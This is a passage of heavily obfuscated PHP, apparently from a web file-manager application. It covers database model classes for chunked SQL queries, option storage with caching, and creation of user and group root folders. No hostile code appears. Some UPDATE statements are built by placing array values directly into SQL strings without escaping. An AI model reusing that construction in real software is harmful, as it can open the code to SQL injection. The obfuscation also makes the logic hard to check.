$‘Ö¾ëˆ¯[359]: if (isset($ó«Îü±ˆ[$˜˜„®–]) && $ó«Îü±ˆ[$˜˜„®–]) { $ó«Îü±ˆ[$˜˜„®–] = call_user_func_array(array(&$this, $©Ç µÓß[1]), array($ó«Îü±ˆ[$˜˜„®–])); } break; case $‘Ö¾ëˆ¯[362]: $ó«Îü±ˆ[$˜˜„®–] = $ó«Îü±ˆ[$©Ç µÓß[1]]; break; case $‘Ö¾ëˆ¯[380]: $Ğ´ÅêÖˆ = $ó«Îü±ˆ[$˜˜„®–]; $ó«Îü±ˆ[$˜˜„®–] = json_decode($Ğ´ÅêÖˆ, !0); if (is_null($ó«Îü±ˆ[$˜˜„®–])) { $ó«Îü±ˆ[$˜˜„®–] = $Ğ´ÅêÖˆ; } break; case $‘Ö¾ëˆ¯[409]: if ($ó«Îü±ˆ[$˜˜„®–] === $‘Ö¾ëˆ¯[12]) { unset($ó«Îü±ˆ[$˜˜„®–]); } break; case $‘Ö¾ëˆ¯[410]: $ó«Îü±ˆ[$˜˜„®–] = $©Ç µÓß[1]; break; default: break; } } } public function saveAll($æâÖ•×) { $²¤àî =& $_SERVER[É¨™èà]; $½í‚¦é½ = $this->tablePrefix . $this->tableName; $·ˆ‚é© = self::SQL_WHERE_IN_CHUNK; $æâÖ•× = is_array($æâÖ•×) ? $æâÖ•× : array(); $Úòšò¥à = $²¤àî[316]; $ß˜´¶Ú’ = 0; $µªî… ¸ = array(); $ÊÚ¬êÊ = count($æâÖ•×); for ($‹Ÿë§ Å = 0; $‹Ÿë§ Å < $ÊÚ¬êÊ; $‹Ÿë§ Å++) { $¤œÜÍ¸´ = $æâÖ•×[$‹Ÿë§ Å]; if (!is_array($¤œÜÍ¸´) || count($¤œÜÍ¸´) != 4) { continue; } $õ¼ù´¨¯ = "\x55\120\104\101\124\x45\40\x60{$½í‚¦é½}\140\40\x53\x45\x54\x20{$¤œÜÍ¸´[2]}\40\x3d\x20\103\101\123\x45\x20{$¤œÜÍ¸´[0]}\x20\xa"; if ($ß˜´¶Ú’ == 0) { $Úòšò¥à = $õ¼ù´¨¯; } $µªî… ¸[] = $²¤àî[121] . $¤œÜÍ¸´[1] . $²¤àî[121]; $ß˜´¶Ú’++; $Úòšò¥à .= "\x20\x57\x48\105\x4e\40\47{$¤œÜÍ¸´[1]}\x27\x20\124\x48\105\x4e\40\47{$¤œÜÍ¸´[3]}\x27\x20\12"; if ($ß˜´¶Ú’ == $·ˆ‚é© || $‹Ÿë§ Å == $ÊÚ¬êÊ - 1) { $²ĞÎ¢å¯ = implode($²¤àî[50], $µªî… ¸); $Úòšò¥à .= "\x20\x45\x4e\104\x20\40\127\x48\x45\x52\x45\x20{$¤œÜÍ¸´[0]}\x20\x49\x4e\40\x28{$²ĞÎ¢å¯}\x29\40"; $this->execute($Úòšò¥à); $ß˜´¶Ú’ = 0; $Úòšò¥à = $õ¼ù´¨¯; $this->chunkEventCheck(count($µªî… ¸)); $µªî… ¸ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ç–²Ÿ´ ) { $¡Ÿ˜Áş¦ =& $_SERVER[É¨™èà]; $ıÅªµ¨ = $this->tablePrefix . $this->tableName; foreach ($ç–²Ÿ´  as $À…Ğ…’Í) { if (!is_array($À…Ğ…’Í) || count($À…Ğ…’Í) != 4) { continue; } $…ñŠğ›ö = $À…Ğ…’Í[0] . $¡Ÿ˜Áş¦[465] . $À…Ğ…’Í[1] . $¡Ÿ˜Áş¦[121]; $¡ÏşâÙÌ = $À…Ğ…’Í[2] . $¡Ÿ˜Áş¦[465] . $À…Ğ…’Í[3] . $¡Ÿ˜Áş¦[121]; $Ó¿â«Ş = "\165\160\144\x61\x74\145\40{$ıÅªµ¨}\40\x73\145\164\40{$¡ÏşâÙÌ}\40\167\x68\145\x72\145\x20{$…ñŠğ›ö}\73"; $this->execute($Ó¿â«Ş); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ƒíö™ÍÒ = false, $œ•³ğå = false) { $this->_chunkEvent = $ƒíö™ÍÒ; $this->_chunkEventParam = $œ•³ğå; } private function chunkEventCheck($Ğ€±šîü) { if (!$this->_chunkEvent) { return; } $ÈÕğ¹¢Š = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÈÕğ¹¢Š[$_SERVER[É¨™èà][466]] = $Ğ€±šîü; Hook::trigger($this->_chunkEvent, $ÈÕğ¹¢Š); } public function addAll($’£Âí—İ, $Á”Â¬© = array(), $…ˆúô¼ş = false) { $Óáªİî¥ =& $_SERVER[É¨™èà]; ignore_timeout(); $¯¦¿Åà = self::SQL_WHERE_IN_CHUNK; if (empty($’£Âí—İ)) { $this->error = think_lang($Óáªİî¥[360]); return !1; } $Á”Â¬© = $this->_parseOptions($Á”Â¬©); foreach ($’£Âí—İ as $‹öë³ => $ ğ‚ƒ¶ş) { $’£Âí—İ[$‹öë³] = $this->_facade($ ğ‚ƒ¶ş); $this->_beforeInsert($’£Âí—İ[$‹öë³], $Á”Â¬©); } if (method_exists($this->db, $Óáªİî¥[361])) { for ($¤ÅÁ‹È = 0; $¤ÅÁ‹È < count($’£Âí—İ); $¤ÅÁ‹È += $¯¦¿Åà) { $†Õ½ø¥¬ = array_slice($’£Âí—İ, $¤ÅÁ‹È, $¯¦¿Åà); if (!is_array($†Õ½ø¥¬) || count($†Õ½ø¥¬) == 0) { break; } $ÂÈÚ¼»¯ = $this->db->insertAll($†Õ½ø¥¬, $Á”Â¬©, $…ˆúô¼ş); $this->chunkEventCheck(count($†Õ½ø¥¬)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($’£Âí—İ as $‹öë³ => $ ğ‚ƒ¶ş) { $ÂÈÚ¼»¯ = $this->db->insert($ ğ‚ƒ¶ş, $Á”Â¬©, $…ˆúô¼ş); } $this->commit(); } if (!1 !== $ÂÈÚ¼»¯) { $ÂšÍóî± = $this->getLastInsID(); if ($ÂšÍóî±) { return $ÂšÍóî±; } } return $ÂÈÚ¼»¯; } public function save($ê»ùÒãĞ = '', $¬©òŸçµ = array()) { $ú°Ç¯Š¾ =& $_SERVER[É¨™èà]; $›¿‡‹ä² = self::SQL_WHERE_IN_CHUNK; $‰ĞÚ©Ú‹ = $this->optionsValue(); $üá»øÆÑ = $this->findWhereField($‰ĞÚ©Ú‹); if (!$üá»øÆÑ) { return parent::save($ê»ùÒãĞ, $¬©òŸçµ); } $€ì”ä· = 0; $¥ƒË•µ— = $‰ĞÚ©Ú‹[$ú°Ç¯Š¾[364]][$üá»øÆÑ][1]; $¥ƒË•µ— = is_array($¥ƒË•µ—) ? $¥ƒË•µ— : array(); $„ş¹¾ßı = count($¥ƒË•µ—); for ($»È…şì = 0; $»È…şì < $„ş¹¾ßı; $»È…şì += $›¿‡‹ä²) { $«ØÓªí˜ = array_slice($¥ƒË•µ—, $»È…şì, $›¿‡‹ä²); if (!is_array($«ØÓªí˜) || count($«ØÓªí˜) == 0) { break; } $‰ĞÚ©Ú‹[$ú°Ç¯Š¾[364]][$üá»øÆÑ][1] = $«ØÓªí˜; $this->optionsValue($‰ĞÚ©Ú‹); $€ì”ä· += parent::save($ê»ùÒãĞ, $¬©òŸçµ); $this->chunkEventCheck(count($«ØÓªí˜)); } $this->chunkEventSet(); return $€ì”ä·; } public function add($Ã¬ÆÑğ = '', $ı¶„áÔ = array(), $æŒ€Òªš = false) { if ($this->addTaskStatus && is_array($Ã¬ÆÑğ)) { $this->addTaskData[] = $Ã¬ÆÑğ; return; } return parent::add($Ã¬ÆÑğ, $ı¶„áÔ, $æŒ€Òªš); } public function parseWhereLike($–¹Ô‹¨‘, $€´ôÅ“î = '', $¤®ñİÔ² = false, &$¸¡Ú¯¸š = false) { $şè›¡Ì =& $_SERVER[É¨™èà]; $Ø¤¿—„¥ = $GLOBALS[$şè›¡Ì[6]][$şè›¡Ì[467]]; if (!$Ø¤¿—„¥[$şè›¡Ì[468]]) { return $–¹Ô‹¨‘; } if (!is_array($–¹Ô‹¨‘)) { return $–¹Ô‹¨‘; } $µÄî­ô« = array(); $ÙÎì€—Ø = 0; foreach ($–¹Ô‹¨‘ as $¨€²ü“è => $É“ëÑ©Ù) { if (is_array($É“ëÑ©Ù) && count($É“ëÑ©Ù) == 2 && $É“ëÑ©Ù[0] == $şè›¡Ì[469] && is_string($É“ëÑ©Ù[1]) && substr($É“ëÑ©Ù[1], 0, 1) == $şè›¡Ì[470] && substr($É“ëÑ©Ù[1], strlen($É“ëÑ©Ù[1]) - 1, 1) == $şè›¡Ì[470]) { $¸¡Ú¯¸š = !0; $°¡Á–Í = is_string($¨€²ü“è) ? $¨€²ü“è : $€´ôÅ“î; $ä‘¬£Ô• = substr($É“ëÑ©Ù[1], 1, strlen($É“ëÑ©Ù[1]) - 2); $ä‘¬£Ô• = $this->db->escapeString($ä‘¬£Ô•); if (!strpos($°¡Á–Í, $şè›¡Ì[10])) { $°¡Á–Í = $şè›¡Ì[471] . $°¡Á–Í . $şè›¡Ì[471]; } $¬‹–ˆø• = $şè›¡Ì[223] . $ä‘¬£Ô• . $şè›¡Ì[223]; $ä‘¬£Ô• = str_replace(array($şè›¡Ì[10], $şè›¡Ì[472], $şè›¡Ì[11]), $şè›¡Ì[473], $ä‘¬£Ô•); if ($Ø¤¿—„¥[$şè›¡Ì[474]]) { $¬‹–ˆø• = $şè›¡Ì[475] . $ä‘¬£Ô• . $şè›¡Ì[476]; if ($Ø¤¿—„¥[$şè›¡Ì[477]]) { $¬‹–ˆø• = $şè›¡Ì[476] . $ä‘¬£Ô• . $şè›¡Ì[475]; } } $µÄî­ô«[$ÙÎì€—Ø] = $şè›¡Ì[478] . $°¡Á–Í . $şè›¡Ì[479] . $¬‹–ˆø• . $şè›¡Ì[480]; $ÙÎì€—Ø++; continue; } if (is_array($É“ëÑ©Ù)) { $€´ôÅ“î = is_string($¨€²ü“è) ? $¨€²ü“è : $€´ôÅ“î; $É“ëÑ©Ù = $this->parseWhereLike($É“ëÑ©Ù, $€´ôÅ“î, !0, $¸¡Ú¯¸š); } if (is_numeric($¨€²ü“è)) { $µÄî­ô«[$ÙÎì€—Ø] = $É“ëÑ©Ù; $ÙÎì€—Ø++; } else { $µÄî­ô«[$¨€²ü“è] = $É“ëÑ©Ù; } } if ($¸¡Ú¯¸š && !$¤®ñİÔ²) { } return $µÄî­ô«; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($—´¾½Ãõ = array()) { $áş…ºí¤ =& $_SERVER[É¨™èà]; $·Âé ¾² = self::SQL_WHERE_IN_CHUNK; $×Ä—ØàØ = $this->optionsValue(); $õß‰ª– = $this->findWhereField($×Ä—ØàØ); if (!$õß‰ª– || isset($×Ä—ØàØ[$áş…ºí¤[379]]) || isset($×Ä—ØàØ[$áş…ºí¤[439]])) { return parent::select($—´¾½Ãõ); } $Æ¬ÇåŞ = $×Ä—ØàØ[$áş…ºí¤[364]][$õß‰ª–][1]; $Æ¬ÇåŞ = is_array($Æ¬ÇåŞ) ? $Æ¬ÇåŞ : array(); $ÕĞ²°½² = null; for ($£Ôª×­± = 0; $£Ôª×­± < count($Æ¬ÇåŞ); $£Ôª×­± += $·Âé ¾²) { $Ö£Ó ¼Ì = array_slice($Æ¬ÇåŞ, $£Ôª×­±, $·Âé ¾²); if (!is_array($Ö£Ó ¼Ì) || count($Ö£Ó ¼Ì) == 0) { break; } $×Ä—ØàØ[$áş…ºí¤[364]][$õß‰ª–][1] = $Ö£Ó ¼Ì; $this->optionsValue($×Ä—ØàØ); $Ó¹ÓÅº = parent::select($—´¾½Ãõ); if (!$Ó¹ÓÅº) { continue; } $ÕĞ²°½² = is_array($ÕĞ²°½²) ? $ÕĞ²°½² : array(); $ÕĞ²°½² = array_merge($ÕĞ²°½², $Ó¹ÓÅº); } return $ÕĞ²°½²; } public function delete($›úß‹Òû = array()) { $Î„üßâ¹ =& $_SERVER[É¨™èà]; $Í›Áõ×® = self::SQL_WHERE_IN_CHUNK; $Ö—€µÛ = $this->optionsValue(); $·½‡ûòÖ = $this->findWhereField($Ö—€µÛ); if (!$·½‡ûòÖ) { return parent::delete($›úß‹Òû); } $±şÇ®„´ = 0; $å‡¯°±š = $Ö—€µÛ[$Î„üßâ¹[364]][$·½‡ûòÖ][1]; $å‡¯°±š = is_array($å‡¯°±š) ? $å‡¯°±š : array(); for ($ñõÜõĞÏ = 0; $ñõÜõĞÏ < count($å‡¯°±š); $ñõÜõĞÏ += $Í›Áõ×®) { $î‚ §ğ = array_slice($å‡¯°±š, $ñõÜõĞÏ, $Í›Áõ×®); if (!is_array($î‚ §ğ) || count($î‚ §ğ) == 0) { break; } $Ö—€µÛ[$Î„üßâ¹[364]][$·½‡ûòÖ][1] = $î‚ §ğ; $this->optionsValue($Ö—€µÛ); $±şÇ®„´ += parent::delete($›úß‹Òû); } return $±şÇ®„´; } private function findWhereField($ÉÚÑ•Üµ) { $²…£Ù Â =& $_SERVER[É¨™èà]; $ò¶åµöê = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÉÚÑ•Üµ) || !is_array($ÉÚÑ•Üµ[$²…£Ù Â[364]])) { return !1; } foreach ($ÉÚÑ•Üµ[$²…£Ù Â[364]] as $øŒºüŸ => $¾½âãÛ÷) { if (is_array($¾½âãÛ÷) && isset($¾½âãÛ÷[0]) && is_string($¾½âãÛ÷[0]) && strtolower($¾½âãÛ÷[0]) == $²…£Ù Â[7] && is_array($¾½âãÛ÷[1]) && count($¾½âãÛ÷[1]) > $ò¶åµöê) { ignore_timeout(); return $øŒºüŸ; } } return !1; } public function setMasterDB($ØÒ›™œµ = true) { think_config($_SERVER[É¨™èà][481], $ØÒ›™œµ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\155\117\x70\164\x69\x6f\156"; public $field = array(); public function listData($œÈ×•Î = false, $ï¡îÛ¢§ = "\155\157\x64\x69\x66\171\124\151\x6d\x65", $È– ÷­ = false) { $å¾×¦ˆÎ = Model($this->modelType)->get(!1, $this->optionType, !0); $öôöœ…” = array_values($å¾×¦ˆÎ); if ($öôöœ…” && $öôöœ…”[0] && !is_array($öôöœ…”[0])) { Model($this->modelType)->cacheRemove($this->optionType); $å¾×¦ˆÎ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$å¾×¦ˆÎ) { return $œÈ×•Î ? null : array(); } if (!$œÈ×•Î) { $å¾×¦ˆÎ = array_filter(array_values($å¾×¦ˆÎ)); return array_sort_by($å¾×¦ˆÎ, $ï¡îÛ¢§, $È– ÷­); } return $å¾×¦ˆÎ[$_SERVER[É¨™èà][482] . $œÈ×•Î]; } public function insert($åïÖĞ’À) { $€ÇˆÙ£» =& $_SERVER[É¨™èà]; $åïÖĞ’À = array_field_key($åïÖĞ’À, $this->field); $Íõ—¾ç— = Model($this->modelType)->get($€ÇˆÙ£»[483], $this->optionType . $€ÇˆÙ£»[484]); $Íõ—¾ç— = $Íõ—¾ç— ? $Íõ—¾ç— : 0; $åïÖĞ’À[$€ÇˆÙ£»[485]] = ++$Íõ—¾ç—; $åïÖĞ’À[$€ÇˆÙ£»[234]] = time(); $åïÖĞ’À[$€ÇˆÙ£»[88]] = time(); Model($this->modelType)->set($€ÇˆÙ£»[483], $Íõ—¾ç—, $this->optionType . $€ÇˆÙ£»[484]); Model($this->modelType)->set($€ÇˆÙ£»[482] . $Íõ—¾ç—, $åïÖĞ’À, $this->optionType); return $Íõ—¾ç—; } public function update($úœˆ½ã€, $îÁ”³‹) { $¤ù¢ºÓ =& $_SERVER[É¨™èà]; $îÁ”³‹ = array_field_key($îÁ”³‹, $this->field); $°ò±Ù = $this->listData($úœˆ½ã€); if (!$°ò±Ù || !$úœˆ½ã€) { return !1; } $îÁ”³‹ = array_merge($°ò±Ù, $îÁ”³‹); $îÁ”³‹[$¤ù¢ºÓ[88]] = time(); return Model($this->modelType)->set($¤ù¢ºÓ[482] . $úœˆ½ã€, $îÁ”³‹, $this->optionType); } public function remove($„Öá…Ø) { if (!$„Öá…Ø) { return !1; } return Model($this->modelType)->remove($_SERVER[É¨™èà][482] . $„Öá…Ø, $this->optionType); } public function clear() { $á”áÌ£Ş =& $_SERVER[É¨™èà]; Model($this->modelType)->remove($á”áÌ£Ş[483], $this->optionType . $á”áÌ£Ş[484]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¡ÃµÓıı, $…Ñ¯ºÄĞ) { if (!$…Ñ¯ºÄĞ) { return !1; } $ùÛÍ¾É = $this->listData(); $ùÛÍ¾É = array_to_keyvalue($ùÛÍ¾É, $¡ÃµÓıı); return isset($ùÛÍ¾É[$…Ñ¯ºÄĞ]) ? $ùÛÍ¾É[$…Ñ¯ºÄĞ] : !1; } public function findByName($¦ĞêõŠë) { return $this->findByKey($_SERVER[É¨™èà][32], $¦ĞêõŠë); } protected function resetData($ÃÓ¤’Õ) { $½å¸úÀø =& $_SERVER[É¨™èà]; $ÃÓ¤’Õ = is_array($ÃÓ¤’Õ) ? $ÃÓ¤’Õ : array(); $¹´Ä£…Ë = array(); for ($Ã¦Ş²È = 0; $Ã¦Ş²È < count($ÃÓ¤’Õ); $Ã¦Ş²È++) { $¹´Ä£…Ë[$½å¸úÀø[482] . $ÃÓ¤’Õ[$Ã¦Ş²È][$½å¸úÀø[485]]] = $ÃÓ¤’Õ[$Ã¦Ş²È]; } return Model($this->modelType)->set($¹´Ä£…Ë, !1, $this->optionType); } private function getAutoName($­´ŞıÄ) { $Õ‘ıü° = array_to_keyvalue($this->listData(), $_SERVER[É¨™èà][32]); if (!$Õ‘ıü° || !isset($Õ‘ıü°[$­´ŞıÄ])) { return $­´ŞıÄ; } for ($†èÃñÚÊ = 1; $†èÃñÚÊ < count($Õ‘ıü°); $†èÃñÚÊ++) { $ßîÙúú = $­´ŞıÄ . "\x28{$†èÃñÚÊ}\x29"; if (!isset($Õ‘ıü°[$ßîÙúú])) { return $ßîÙúú; } } return $ßîÙúú; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ğäò§ûÄ = false, $¦¦Ğ£¶ = '', $ÁøÓ÷· = false) { $Ş©ĞñÄâ =& $_SERVER[É¨™èà]; $˜ºàæŠ = $this->cacheGet($¦¦Ğ£¶); $«ê‡ØÈ¦ = $this->optionDefault($¦¦Ğ£¶); $«ê‡ØÈ¦ = is_array($«ê‡ØÈ¦) ? $«ê‡ØÈ¦ : array(); if (is_array($˜ºàæŠ)) { $˜ºàæŠ = array_merge($«ê‡ØÈ¦, $˜ºàæŠ); return $Ğäò§ûÄ ? isset($˜ºàæŠ[$Ğäò§ûÄ]) ? $˜ºàæŠ[$Ğäò§ûÄ] : null : $˜ºàæŠ; } $ÂËó„Ûá = $this->filterWhere(array($Ş©ĞñÄâ[33] => $¦¦Ğ£¶)); $˜ºàæŠ = $this->where($ÂËó„Ûá)->select(); $˜ºàæŠ = array_to_keyvalue($˜ºàæŠ, $Ş©ĞñÄâ[97], $Ş©ĞñÄâ[461]); foreach ($˜ºàæŠ as $Ë¸Öˆ => $”áç²€ª) { if ($ÁøÓ÷· || in_array($Ë¸Öˆ, $this->jsonField)) { $˜ºàæŠ[$Ë¸Öˆ] = json_decode($”áç²€ª, !0); } } $this->cacheSet($¦¦Ğ£¶, $˜ºàæŠ); $˜ºàæŠ = array_merge($«ê‡ØÈ¦, $˜ºàæŠ); return $Ğäò§ûÄ ? $˜ºàæŠ[$Ğäò§ûÄ] : $˜ºàæŠ; } public function set($éİÂ››Ë, $ÑìˆúÍ“ = false, $­›â„õ = '') { $¹™Œº =& $_SERVER[É¨™èà]; $this->cacheRemove($­›â„õ); $Æë…ÆáÛ = array(); $Õ¸ÂÖÜ = is_array($éİÂ››Ë) ? $éİÂ››Ë : array($éİÂ››Ë => $ÑìˆúÍ“); foreach ($Õ¸ÂÖÜ as $ŞøŸ–ù => $àŞ¨ØõÉ) { if (is_array($àŞ¨ØõÉ)) { $àŞ¨ØõÉ = json_encode_force($àŞ¨ØõÉ); } $this->checkLength($àŞ¨ØõÉ, !1, $this->tableName . $¹™Œº[4] . $éİÂ››Ë); $àŞ¨ØõÉ = self::textEncode($àŞ¨ØõÉ); $Õ¸ÂÖÜ = array($¹™Œº[33] => $­›â„õ, $¹™Œº[97] => $ŞøŸ–ù, $¹™Œº[461] => $àŞ¨ØõÉ); $Æë…ÆáÛ[] = $this->filterWhere($Õ¸ÂÖÜ); } if (!$Æë…ÆáÛ) { return !0; } $Æ€ª™Ññ = $this->cacheKey($¹™Œº[486]); CacheLock::lock($Æ€ª™Ññ); $è§¦‚Ş¯ = $this->addAll($Æë…ÆáÛ, array(), !0); CacheLock::unlock($Æ€ª™Ññ); return $è§¦‚Ş¯; } protected function optionDefault($¨åä¹¹ = '') { return !1; } public function setDeep($°È¢òë, $–ÙÅÂÍ = false, $€›‚ßˆÃ = '') { $¼úöÎ¹Ì = explode($_SERVER[É¨™èà][10], $°È¢òë); $ôÈøÛ»® = $this->get(); array_set_value($ôÈøÛ»®, $°È¢òë, $–ÙÅÂÍ); $this->set($¼úöÎ¹Ì[0], $ôÈøÛ»®[$¼úöÎ¹Ì[0]], $€›‚ßˆÃ); } public function remove($¿ÖÈ³, $÷Œ¹ÜóÎ = '') { $ØãğèÕ¹ =& $_SERVER[É¨™èà]; $this->cacheRemove($÷Œ¹ÜóÎ); $ÎêĞ ¤ã = $this->filterWhere(array($ØãğèÕ¹[97] => $¿ÖÈ³, $ØãğèÕ¹[33] => $÷Œ¹ÜóÎ)); if (is_null($¿ÖÈ³)) { unset($ÎêĞ ¤ã[$ØãğèÕ¹[97]]); } return $this->where($ÎêĞ ¤ã)->delete(); } public function cacheSet($øíˆ¾¸, $š«ÊÈ– = false) { return Cache::set($this->cacheKey($øíˆ¾¸), $š«ÊÈ–); } public function cacheGet($õë¡áüğ) { return Cache::get($this->cacheKey($õë¡áüğ)); } public function cacheRemove($ïò¬ıÓÇ) { return Cache::remove($this->cacheKey($ïò¬ıÓÇ)); } protected function filterWhere($úÃÒÜÉ„) { return $úÃÒÜÉ„; } protected function cacheKey($™î‚ãş¡) { return $™î‚ãş¡; } } goto CÇ©Ø±ÌİÔ; eíÒÂÃ…ƒ’: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($İ„´çÖÔ) { $½Ñ¬¸é =& $_SERVER[É¨™èà]; $€Ìá†ôÜ = Model($½Ñ¬¸é[589])->where(array($½Ñ¬¸é[1791] => $İ„´çÖÔ))->find(); $³Âšµ‡÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $İ„´çÖÔ, $€Ìá†ôÜ[$½Ñ¬¸é[32]]); $this->userDesktopAdd($³Âšµ‡÷); return $³Âšµ‡÷; } public function userDesktopAdd($È°ıÇ–) { $ÌëøÚŠ =& $_SERVER[É¨™èà]; $•‹×Ş—À = LNG($ÌëøÚŠ[2285]); $ø€ ‘Ÿ = $this->mkdir($È°ıÇ–, $•‹×Ş—À); $this->metaSet($ø€ ‘Ÿ, $ÌëøÚŠ[2286], $ÌëøÚŠ[91]); $this->metaSet($È°ıÇ–, $ÌëøÚŠ[2287], $ø€ ‘Ÿ); } public function userPathSafeAdd($ä¨›Ñİ¾) { $ÖÌ¡êÈŞ =& $_SERVER[É¨™èà]; $Ãßé“È = Model($ÖÌ¡êÈŞ[589])->getInfoFull($ä¨›Ñİ¾); if (!$Ãßé“È) { return !1; } if (_get($Ãßé“È, $ÖÌ¡êÈŞ[610])) { return $Ãßé“È[$ÖÌ¡êÈŞ[551]][$ÖÌ¡êÈŞ[2288]]; } $˜É«—ªÔ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ä¨›Ñİ¾, $ÖÌ¡êÈŞ[2289], $ÖÌ¡êÈŞ[2290]); Model($ÖÌ¡êÈŞ[589])->metaSet($ä¨›Ñİ¾, $ÖÌ¡êÈŞ[2288], $˜É«—ªÔ); $this->metaSet($˜É«—ªÔ, $ÖÌ¡êÈŞ[2291], $ä¨›Ñİ¾); return $˜É«—ªÔ; } public function userPathAppAdd($¯àÆ¶…Ä, $½Œ¬Š¿¨ = '', $©Í‰õı¯ = '') { $í´ßšĞÊ =& $_SERVER[É¨™èà]; $Å®ºÆÛ¦ = Model($í´ßšĞÊ[589])->getInfoFull($¯àÆ¶…Ä); if (!$Å®ºÆÛ¦) { return !1; } $‚±üÄı¦ = $Å®ºÆÛ¦[$í´ßšĞÊ[551]] ? $Å®ºÆÛ¦[$í´ßšĞÊ[551]] : array(); $×¡ŞàÓª = $‚±üÄı¦[$í´ßšĞÊ[2292]]; if (!$×¡ŞàÓª) { $×¡ŞàÓª = $this->_mkdirRoot(SourceModel::TYPE_USER, $¯àÆ¶…Ä, $í´ßšĞÊ[2293], $í´ßšĞÊ[2294]); Model($í´ßšĞÊ[589])->metaSet($¯àÆ¶…Ä, $í´ßšĞÊ[2292], $×¡ŞàÓª . $í´ßšĞÊ[12]); $this->metaSet($×¡ŞàÓª, $í´ßšĞÊ[2292], $¯àÆ¶…Ä); } if (!$½Œ¬Š¿¨) { return $×¡ŞàÓª; } $çÔ§•×â = $‚±üÄı¦[$í´ßšĞÊ[2295] . $½Œ¬Š¿¨]; if (!$çÔ§•×â) { $çÔ§•×â = $this->mkdir($×¡ŞàÓª, $½Œ¬Š¿¨); Model($í´ßšĞÊ[589])->metaSet($¯àÆ¶…Ä, $í´ßšĞÊ[2295] . $½Œ¬Š¿¨, $çÔ§•×â); $this->metaSet($çÔ§•×â, $í´ßšĞÊ[2295] . $½Œ¬Š¿¨, $¯àÆ¶…Ä); } if (!$©Í‰õı¯) { return $çÔ§•×â; } $Ê‰‘ƒŞà = $this->mkdir($çÔ§•×â, $©Í‰õı¯); return $Ê‰‘ƒŞà; } public function groupRootAdd($àıäÂ¶ç) { $¾«ŸÈ”Ê =& $_SERVER[É¨™èà]; $•éö¦àñ = Model($¾«ŸÈ”Ê[597])->where(array($¾«ŸÈ”Ê[2089] => $àıäÂ¶ç))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $àıäÂ¶ç, $•éö¦àñ[$¾«ŸÈ”Ê[32]]); } public function systemRootPathAdd($úù¹ç¬õ) { if ($úù¹ç¬õ != $_SERVER[É¨™èà][620]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $úù¹ç¬õ); } public function userRootRemove($ß¶ÛÚ³°) { $´ûî¥Û± = $this->targetSourceRoot(SourceModel::TYPE_USER, $ß¶ÛÚ³°, !0); foreach ($´ûî¥Û± as $ŠÔ£ŠÆ) { if (!$ŠÔ£ŠÆ) { continue; } $this->remove($ŠÔ£ŠÆ[$_SERVER[É¨™èà][194]], !1); } } public function groupRootRemove($óè‹ğÂ©) { $³°¯åŒ® = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $óè‹ğÂ©); if (!$³°¯åŒ®) { return; } $this->remove($³°¯åŒ®[$_SERVER[É¨™èà][194]], !1); } private function _mkdirRoot($ÎÇˆµ¢Ò, $Ğåª£Õ , $éÆ¶“¸ğ, $»“ÊŞ¾ê = '') { $ıÓåáË¬ =& $_SERVER[É¨™èà]; $¿‡úÑÚî = defined($ıÓåáË¬[2230]) ? USER_ID : 0; $ÓÔº®æê = array($ıÓåáË¬[487] => 0, $ıÓåáË¬[663] => $ÎÇˆµ¢Ò, $ıÓåáË¬[664] => $Ğåª£Õ , $ıÓåáË¬[661] => 1, $ıÓåáË¬[665] => $¿‡úÑÚî, $ıÓåáË¬[666] => $¿‡úÑÚî, $ıÓåáË¬[662] => $»“ÊŞ¾ê, $ıÓåáË¬[667] => $ıÓåáË¬[605], $ıÓåáË¬[514] => 0, $ıÓåáË¬[632] => 0, $ıÓåáË¬[554] => 0, $ıÓåáË¬[668] => $ıÓåáË¬[12]); if ($˜Ã‘Èñ‹ = $this->where($ÓÔº®æê)->find()) { return $˜Ã‘Èñ‹[$ıÓåáË¬[194]]; } $óÊ°¥Ì = "\x4d\x6f\x64\x65\x6c\123\x6f\x75\x72\143\145\x2e\x6d\x6b\x64\x69\162\122\157\x6f\x74\x2e{$ÎÇˆµ¢Ò}\56{$Ğåª£Õ }\56" . $éÆ¶“¸ğ; CacheLock::lock($óÊ°¥Ì); $ÓÔº®æê[$ıÓåáË¬[32]] = $éÆ¶“¸ğ; $«ƒÊ­½ú = $this->add($ÓÔº®æê); $ş©ğä£‰ = array($ıÓåáË¬[669] => short_id($«ƒÊ­½ú)); $this->where(array($ıÓåáË¬[501] => $«ƒÊ­½ú))->save($ş©ğä£‰); CacheLock::unlock($óÊ°¥Ì); return $«ƒÊ­½ú; } private function targetSourceRoot($•®…Ìñ, $µõÍÉ¯Ü, $¹ã¨ôò¼ = false) { $„ï¼ñª‹ =& $_SERVER[É¨™èà]; $ŸğõÒ´š = array($„ï¼ñª‹[487] => 0, $„ï¼ñª‹[663] => $•®…Ìñ, $„ï¼ñª‹[664] => $µõÍÉ¯Ü); if ($¹ã¨ôò¼) { $  şñ‚ = $this->where($ŸğõÒ´š)->select(); return $  şñ‚ ? $  şñ‚ : array(); } $ûÂîõ€… = $this->where($ŸğõÒ´š)->find(); return $ûÂîõ€… ? $ûÂîõ€… : array(); } public function sourceRootGroup($¥™±¥õ¼) { $â†¯§¨§ =& $_SERVER[É¨™èà]; if (is_string($¥™±¥õ¼)) { $¥™±¥õ¼ = array($¥™±¥õ¼); } $¢æÇùÙà = $this->listSourceRoot(SourceModel::TYPE_GROUP, 